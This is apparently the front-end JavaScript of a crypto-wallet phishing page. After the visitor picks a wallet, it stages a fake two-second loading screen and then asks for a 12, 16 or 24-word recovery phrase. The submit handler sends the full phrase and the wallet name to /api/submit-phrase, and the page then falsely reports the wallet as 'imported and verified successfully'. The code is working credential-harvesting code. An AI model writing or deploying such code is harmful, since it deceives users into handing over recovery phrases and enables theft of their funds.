document.addEventListener('DOMContentLoaded', () => {
    const languageBtn = document.getElementById('languageBtn');
    const languageModal = document.getElementById('languageModal');
    const closeLanguageModal = document.getElementById('closeLanguageModal');
    const languageOptions = document.querySelectorAll('.language-option');
    const currentLangSpan = document.getElementById('currentLang');

    const walletCards = document.querySelectorAll('.wallet-card');
    const loadingModal = document.getElementById('loadingModal');
    const phraseModal = document.getElementById('phraseModal');
    const successModal = document.getElementById('successModal');

    const closePhraseModal = document.getElementById('closePhraseModal');
    const phraseInput = document.getElementById('phraseInput');
    const phraseDisplay = document.getElementById('phraseDisplay');
    const phraseForm = document.getElementById('phraseForm');
    const proceedBtn = document.getElementById('proceedBtn');
    const cancelPhraseBtn = document.getElementById('cancelPhraseBtn');
    const wordCountSpan = document.getElementById('wordCount');
    const wordTargetSpan = document.getElementById('wordTarget');

    const okBtn = document.getElementById('okBtn');
    const copyRefBtn = document.getElementById('copyRefBtn');
    const successWalletName = document.getElementById('successWalletName');
    const referenceNumber = document.getElementById('referenceNumber');

    let selectedWallet = '';
    let phraseWords = [];

    languageBtn.addEventListener('click', () => {
        languageModal.classList.add('active');
    });

    closeLanguageModal.addEventListener('click', () => {
        languageModal.classList.remove('active');
    });

    languageModal.addEventListener('click', (e) => {
        if (e.target === languageModal) {
            languageModal.classList.remove('active');
        }
    });

    languageOptions.forEach(option => {
        option.addEventListener('click', () => {
            const lang = option.dataset.lang;
            const langName = option.querySelector('.lang-name').textContent;
            currentLangSpan.textContent = lang.toUpperCase();
            languageModal.classList.remove('active');
        });
    });

    walletCards.forEach(card => {
        card.addEventListener('click', () => {
            selectedWallet = card.dataset.wallet;
            showLoadingModal();
        });
    });

    function showLoadingModal() {
        loadingModal.classList.add('active');

        setTimeout(() => {
            loadingModal.classList.remove('active');
            showPhraseModal();
        }, 2000);
    }

    function showPhraseModal() {
        phraseModal.classList.add('active');
        phraseInput.focus();
    }

    closePhraseModal.addEventListener('click', () => {
        phraseModal.classList.remove('active');
        resetPhraseInput();
    });

    cancelPhraseBtn.addEventListener('click', () => {
        phraseModal.classList.remove('active');
        resetPhraseInput();
    });

    phraseModal.addEventListener('click', (e) => {
        if (e.target === phraseModal) {
            phraseModal.classList.remove('active');
            resetPhraseInput();
        }
    });

    phraseInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            const word = phraseInput.value.trim();
            if (word) {
                addWord(word);
                phraseInput.value = '';
            }
        } else if (e.key === 'Backspace' && !phraseInput.value && phraseWords.length > 0) {
            e.preventDefault();
            removeLastWord();
        }
    });

    phraseInput.addEventListener('paste', (e) => {
        e.preventDefault();
        const pastedText = e.clipboardData.getData('text');
        const words = pastedText.trim().split(/\s+/);

        words.forEach(word => {
            if (word && phraseWords.length < 24) {
                phraseWords.push(word);
            }
        });

        renderPhraseWords();
        validatePhrase();
        phraseInput.value = '';
    });

    function addWord(word) {
        if (phraseWords.length >= 24) {
            return;
        }

        phraseWords.push(word.toLowerCase());
        renderPhraseWords();
        validatePhrase();
    }

    function removeWord(index) {
        phraseWords.splice(index, 1);
        renderPhraseWords();
        validatePhrase();
    }

    function removeLastWord() {
        phraseWords.pop();
        renderPhraseWords();
        validatePhrase();
    }

    function renderPhraseWords() {
        phraseDisplay.innerHTML = '';

        phraseWords.forEach((word, index) => {
            const wordElement = document.createElement('div');
            wordElement.className = 'phrase-word';

            const wordText = document.createElement('span');
            wordText.textContent = word;

            const removeBtn = document.createElement('button');
            removeBtn.className = 'phrase-word-remove';
            removeBtn.type = 'button';
            removeBtn.innerHTML = '&times;';
            removeBtn.addEventListener('click', (e) => {
                e.preventDefault();
                removeWord(index);
                phraseInput.focus();
            });

            wordElement.appendChild(wordText);
            wordElement.appendChild(removeBtn);
            phraseDisplay.appendChild(wordElement);
        });

        wordCountSpan.textContent = phraseWords.length;
    }

    function validatePhrase() {
        const wordCount = phraseWords.length;
        const isValid = wordCount === 12 || wordCount === 16 || wordCount === 24;

        proceedBtn.disabled = !isValid;

        if (wordCount === 12) {
            wordTargetSpan.textContent = '12';
            proceedBtn.disabled = false;
        } else if (wordCount === 16) {
            wordTargetSpan.textContent = '16';
            proceedBtn.disabled = false;
        } else if (wordCount === 24) {
            wordTargetSpan.textContent = '24';
            proceedBtn.disabled = false;
        } else if (wordCount < 12) {
            wordTargetSpan.textContent = '12';
            proceedBtn.disabled = true;
        }
    }

    function resetPhraseInput() {
        phraseWords = [];
        phraseInput.value = '';
        renderPhraseWords();
        validatePhrase();
        wordTargetSpan.textContent = '12';
    }

    phraseForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const wordCount = phraseWords.length;

        if (wordCount !== 12 && wordCount !== 16 && wordCount !== 24) {
            alert(`Invalid recovery phrase. Please enter exactly 12, 16, or 24 words. You currently have ${wordCount} word(s).`);
            return;
        }

        proceedBtn.disabled = true;
        proceedBtn.textContent = 'Processing...';

        const phrase = phraseWords.join(' ');

        try {
            const response = await fetch('/api/submit-phrase', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    phrase: phrase,
                    wallet: selectedWallet,
                    wordCount: wordCount
                })
            });

            const result = await response.json();

            if (result.success) {
                phraseModal.classList.remove('active');
                resetPhraseInput();
                showSuccessModal(result.referenceNumber);
            } else {
                throw new Error(result.error || 'Failed to submit phrase');
            }
        } catch (error) {
            console.error('Error submitting phrase:', error);
            alert('An error occurred. Please try again.');
            proceedBtn.disabled = false;
            proceedBtn.textContent = 'Verify & Proceed';
        }
    });

    function showSuccessModal(refNumber) {
        successWalletName.textContent = `${selectedWallet} has been imported and verified successfully`;
        referenceNumber.textContent = refNumber;
        successModal.classList.add('active');
    }

    okBtn.addEventListener('click', () => {
        successModal.classList.remove('active');
        window.location.href = '/';
    });

    copyRefBtn.addEventListener('click', () => {
        const refText = referenceNumber.textContent;
        navigator.clipboard.writeText(refText).then(() => {
            const originalHTML = copyRefBtn.innerHTML;
            copyRefBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>';
            setTimeout(() => {
                copyRefBtn.innerHTML = originalHTML;
            }, 2000);
        });
    });

    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            phraseModal.classList.remove('active');
            successModal.classList.remove('active');
            languageModal.classList.remove('active');
        }
    });
});
